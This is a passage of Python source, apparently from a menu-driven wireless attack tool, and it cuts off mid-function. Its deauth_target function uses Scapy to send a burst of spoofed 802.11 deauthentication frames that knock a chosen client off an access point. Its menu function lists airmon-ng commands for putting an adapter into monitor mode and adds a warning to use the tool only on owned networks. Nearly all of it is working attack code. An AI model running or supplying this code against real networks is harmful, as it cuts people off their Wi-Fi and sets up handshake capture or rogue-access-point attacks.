def deauth_target(target_mac, ap_mac, mon_iface, count=200):
    pkt = (RadioTap() /
           Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
           Dot11Deauth(reason=7))
    sendp(pkt, iface=mon_iface, count=count, inter=0.05, verbose=False)

def menu_deauth():
    console.print(Panel(
        "[yellow]Deauth requires a second USB WiFi adapter in [bold]monitor mode[/bold].\n\n"
        "[cyan]Setup commands:[/]\n"
        "  sudo airmon-ng check kill\n"
        "  sudo airmon-ng start wlan1\n"
        "  → creates interface [bold]wlan1mon[/bold]\n\n"
        "[red]⚠  Only use on networks you own or manage.[/red]",
